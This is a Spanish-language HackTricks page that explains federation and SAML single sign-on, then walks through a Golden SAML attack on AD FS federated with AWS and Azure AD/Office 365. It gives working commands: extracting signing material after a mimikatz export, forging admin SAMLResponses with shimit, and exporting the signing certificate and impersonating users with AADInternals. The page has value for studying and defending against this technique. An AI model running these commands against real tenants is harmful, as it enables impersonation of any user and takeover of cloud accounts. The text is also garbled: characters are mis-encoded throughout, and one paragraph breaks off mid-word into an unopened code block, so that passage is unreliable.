# Federaci√≥n

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n b√°sica

**Federaci√≥n** es una colecci√≥n de **dominios** que han establecido **confianza**. El nivel de confianza puede variar, pero generalmente incluye **autenticaci√≥n** y casi siempre incluye **autorizaci√≥n**. Una federaci√≥n t√≠pica puede incluir un **n√∫mero de organizaciones** que han establecido **confianza** para **acceso compartido** a un conjunto de recursos.

Puede **federar su entorno local** con Azure AD y utilizar esta federaci√≥n para la autenticaci√≥n y autorizaci√≥n. Este m√©todo de inicio de sesi√≥n garantiza que toda la **autenticaci√≥n del usuario se produzca en el entorno local**. Este m√©todo permite a los administradores implementar niveles m√°s rigurosos de control de acceso. La federaci√≥n con **AD FS** y PingFederate est√° disponible.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

B√°sicamente, en la Federaci√≥n, toda la **autenticaci√≥n** se produce en el entorno **local** y el usuario experimenta SSO en todos los entornos de confianza. Por lo tanto, los usuarios pueden **acceder a las aplicaciones en la nube** utilizando sus **credenciales locales**.

Se utiliza **Security Assertion Markup Language (SAML)** para **intercambiar** toda la informaci√≥n de autenticaci√≥n y autorizaci√≥n entre los proveedores.

En cualquier configuraci√≥n de federaci√≥n hay tres partes:

* Usuario o cliente
* Proveedor de identidad (IdP):
* Proveedor de servicios (SP)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. Primero, el usuario **intenta acceder a una aplicaci√≥n** (tambi√©n conocida como SP, es decir, proveedor de servicios), que podr√≠a ser una consola de AWS, un cliente web de vSphere, etc. Dependiendo de la implementaci√≥n, el cliente puede ir directamente al IdP primero y omitir el primer paso en este diagrama.
2. La aplicaci√≥n luego **detecta el IdP** (es decir, el proveedor de identidad, que podr√≠a ser AD FS, Okta, etc.) para autenticar al usuario, **genera una solicitud de autenticaci√≥n SAML** y redirige al cliente al IdP.
3. El **IdP autentica al usuario**, **crea una respuesta SAML** y la env√≠a al SP a trav√©s del usuario.
4. El SP **verifica la respuesta SAML** y **inicia sesi√≥n en el usuario**. El SP debe tener una relaci√≥n de confianza con el IdP. El usuario ahora puede utilizar el servicio.

**Si desea obtener m√°s informaci√≥n sobre la autenticaci√≥n SAML y los ataques comunes, vaya a:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoteo

* AD FS es un modelo de identidad basado en reclamaciones.
* "..las reclamaciones son simplemente declaraciones (por ejemplo, nombre, identidad, grupo), hechas sobre usuarios, que se utilizan principalmente para autorizar el acceso a aplicaciones basadas en reclamaciones ubicadas en cualquier lugar de Internet."
* Las reclamaciones para un usuario se escriben dentro de los tokens SAML y luego se firman para proporcionar confidencialidad por parte del IdP.
* Un usuario es identificado por ImmutableID. Es globalmente √∫nico y se almacena en Azure AD.
* El ImmutableID se almacena en el entorno local como ConsistencyGuid para el usuario y / o se puede derivar del GUID del usuario.
* M√°s informaci√≥n en [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Ataque Golden SAML:**

* En ADFS, la respuesta SAML est√° firmada por un certificado de firma de tokens.
* Si el certificado est√° comprometido, ¬°es posible autenticarse en Azure AD como CUALQUIER usuario sincronizado con Azure AD!
* Al igual que nuestro abuso de PTA, el cambio de contrase√±a para un usuario o MFA no tendr√° ning√∫n efecto porque estamos forjando la respuesta de autenticaci√≥n.
* El certificado se puede extraer del servidor AD FS con privilegios de DA y luego se puede utilizar desde cualquier m√°quina conectada a Internet.
* M√°s informaci√≥n en [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

De la figura anterior, la parte m√°s interesante es la tercera, donde el **IdP** genera una **respuesta SAML** autorizando al usuario a iniciar sesi√≥n. Dependiendo de la implementaci√≥n espec√≠fica de IdP, la **respuesta** puede ser **firmada** o **cifrada** por la **clave privada del IdP**. De esta manera, el **SP puede verificar** que la respuesta SAML fue creada por el IdP de confianza.

Similar a un [ataque de golden ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), con la **clave** que **firma** el objeto que contiene la **identidad y permisos del usuario** (_KRBTGT_ para golden ticket y clave privada de firma de tokens para golden SAML), podemos entonces **forjar tal "objeto de autenticaci√≥n"** (TGT o SAMLResponse) e **impersonar cualquier usuario** para obtener acceso no autorizado al SP.

Adem√°s, los golden SAML tienen las siguientes ventajas:

* Se pueden **generar** desde pr√°cticamente **cualquier lugar**. No es necesario ser parte de un dominio, federaci√≥n o cualquier otro entorno con el que est√© tratando
* Son efectivos incluso cuando se habilita **2FA**
* La **clave privada** de firma de tokens **no se renueva** autom√°ticamente
* **Cambiar** la **contrase√±a** de un usuario **no afectar√°** al SAML generado

#### AWS + AD FS + Golden SAML = ‚ô• (estudio de caso)

[Active Directory Federation Services](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) (**AD FS**) es un servicio de dominio basado en est√°ndares de Microsoft que permite el **intercambio seguro de informaci√≥n de identidad** entre socios comerciales de confianza (**federaci√≥n**). B√°sicamente, es un servicio en un dominio que proporciona identidades de usuario de dominio a otros proveedores de servicios dentro de una federaci√≥n.

Suponiendo que AWS **conf√≠a** en el dominio que ha comprometido (en una federaci√≥n), entonces puede aprovechar este ataque y pr√°cticamente **obtener cualquier permiso en el entorno en la nube**. Para realizar este ataque, necesitar√° la **clave privada que firma los objetos SAML** (similarmente a la necesidad del KRBTGT en un golden ticket). Para esta clave privada, no necesita acceso de administrador de dominio, solo necesitar√° la cuenta de usuario de AD FS.

Aqu√≠ hay una lista de los requisitos para realizar un ataque golden SAML:

* **Clave privada de firma de tokens**
* **Certificado p√∫blico de IdP**
* **Nombre de IdP**
* **Nombre de rol (rol a asumir)**
* Dominio\nombre de usuario
* Nombre de sesi√≥n de rol en AWS
* ID de cuenta de Amazon

_Se resaltan los requisitos obligator
# Desde una sesi√≥n de "AD FS"
# Despu√©s de haber exportado la clave con mimikatz

# Certificado p√∫blico de AD FS
[System.Convert]::ToBase64String($cer.rawdata)

# Nombre de IdP
(Get-ADFSProperties).Identifier.AbsoluteUri

# Nombre de rol
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```

Con toda la informaci√≥n, es posible obtener un SAMLResponse v√°lido como el usuario que se desea suplantar utilizando [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Aplicar sesi√≥n para AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - URL del proveedor de identidad, por ejemplo, http://server.domain.com/adfs/services/trust
# pk - Ruta completa del archivo de clave privada (formato pem)
# c - Ruta completa del archivo de certificado (formato pem)
# u - Nombre de usuario y dominio, por ejemplo, domain\username (use \ o comillas en *nix)
# n - Nombre de sesi√≥n en AWS
# r - Roles deseados en AWS. Admite m√∫ltiples roles, el primero especificado se asumir√°.
# id - ID de cuenta de AWS, por ejemplo, 123456789012

# Guardar SAMLResponse en archivo
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud

```powershell
# Con un usuario de dominio se puede obtener el ImmutableID del usuario objetivo
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# En el servidor AD FS ejecutar como administrador
Get-AdfsProperties | select identifier

# Al configurar el AD FS usando Azure AD Connect, hay una diferencia entre IssueURI en el servidor ADFS y Azure AD.
# Debe usar el de AzureAD.
# Por lo tanto, verifique tambi√©n el IssuerURI de Azure AD (Use el m√≥dulo MSOL y necesite privilegios GA)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extraer el certificado de firma de token ADFS del servidor ADFS usando AADInternals
Export-AADIntADFSSigningCertificate

# Suplantar a un usuario para acceder a aplicaciones en la nube
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

Tambi√©n es posible crear ImmutableID de usuarios solo en la nube y suplantarlos

```powershell
# Crear un ImmutableID realista y establecerlo para un usuario solo en la nube
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extraer el certificado de firma de token ADFS del servidor ADFS usando AADInternals
Export-AADIntADFSSigningCertificate

# Suplantar al usuario
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```

## Referencias

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a **tu empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos.
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>